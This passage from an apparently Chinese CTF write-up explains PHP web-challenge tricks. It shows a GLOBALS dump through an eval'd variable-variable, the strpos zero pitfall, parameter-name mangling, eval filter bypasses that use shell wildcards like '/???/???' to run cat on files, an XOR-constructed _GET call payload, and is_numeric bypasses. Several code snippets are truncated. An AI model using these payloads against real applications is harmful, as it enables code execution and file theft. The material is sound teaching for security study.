    ?>
payload:`http://120.24.86.145:8004/index1.php?args=GLOBALS`  
因为有eval("var_dump($$args);"); 直接用全局变量打印所有字符串即可得到flag
## strpos()的小坑
### 函数介绍
#### 实例
查找"touch"在字符串中第一次出现的位置：
#### 定义和用法
strpos() 函数查找字符串在另一字符串中第一次出现的位置。  
strpos() 函数对大小写敏感。  
该函数是二进制安全的。  
`strpos(string, find, start)` _string_ 和 _find_ 必需， _start_ 可选，规定在何处开始搜索。
#### 相关函数
  * **stripos()** \- 查找字符串在另一字符串中第一次出现的位置（不区分大小写）
  * **strripos()** \- 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）
  * **strrpos()** \- 查找字符串在另一字符串中最后一次出现的位置（区分大小写）
### 坑
判断的时候是不能用 _!= false_ 来判断的，因为当查找的字符串位置为0 时也会判断成功
返回结果：
## PHP的一个小特性
乌云链接：  
当代码中存在 _\$_REQUEST['user_id']_ 里面类似的参数的时候，我们在url上可以这样 _a.php?user.id_
传参去进行绕过,这样进去之后也能表示 _$_REQUEST['user_id']_ 的值，同样可以绕过的符号还有+，[ 等，应该说是php的一个小特性
> 安恒月赛 奇怪的恐龙特性
题目源码：
    0) {
        echo 'A_A,too big';
    }
    else{
        echo file_get_contents('flag.php');
    }
    ?>
阅读代码发现，首先第一步要绕过A_A这个符号，如果出现这个符号他就会显示A_A,have
fun，就不能继续往下面执行到file_get_contents('flag.php')了，但是我们发送get参数的时候又必须要发送，因此我们就用到刚才的知识点，我们可以用A.A或者是A+A去传参去绕过。  
下面的代码就是常规的数字绕过了，但这里也用到了一个trick，就是无论你的数字多大，对于数组而言总是比数组小。
利用数组去绕过$str 安恒九月赛 babybypass
    35){
            die("Long.");
        }
        if(preg_match("/[A-Za-z0-9_$]+/",$code)){
            die("NO.");
        }
        @eval($code);
    }else{
        highlight_file(__FILE__);
    }
    //$hint =  "php function getFlag() to get flag";
    ?>
根据代码要求：
    1. 长度不能大于35
    2. 不能包含大小写字母，数字，下划线和$符号
在linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用? * %等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试：  
`???/??? => /bin/cat`  
PHP开启短标签即`short_open_tag=on`时，可以使用``输出变量  
于是读源码：
    $_=`/???/???%20/???/???/????/?????.???`;?>
    "/bin/cat /var/www/html/index.php"
长度超出上限，使用 _通配：  
`$_=`/???/???%20/???/???/????/_`;?>`  
正则过滤了$和_,改进为：  
`?>`  
可以读到：
    function getFlag(){
        $flag = file_get_contents('/flag');
        echo $flag;
    }
直接读flag文件  
`?>`
另外类似的一道题
> 道格bypass
    50){
            die("Too Long.");
        }
        if(preg_match("/[A-Za-z0-9_]+/",$code)){
            die("Not Allowed.");
        }
        @eval($code);
    }else{
        highlight_file(__FILE__);
    }
    //$hint =  "php function getFlag() to get flag";
相关文章：  
    $￥="`{{{"^"?<>/" // _GET
利用`${}`中的代码会被执行的特点
    ${$￥}[￥](${$￥}[￥￥]);
传参  
`&￥=Flag`  
最终payload：
    ?code=$￥="`{{{"^"?<>/";${$￥}[￥](${$￥}[￥￥]);&￥=Flag
## is_numeric绕过
> 极客大挑战
题目源码：
     99999999 && strlen($_GET['p1']) 
第一个常见的>999999999，用指数1e9即可绕过
    echo 1e9; //1000000000
第二个函数`is_numeric()`判断是否为数字，因为PHP的弱类型，将数字后面加上空格或者任意一个字符即可绕过。
最终payload：  
`?p1=1e9&p2=2%20`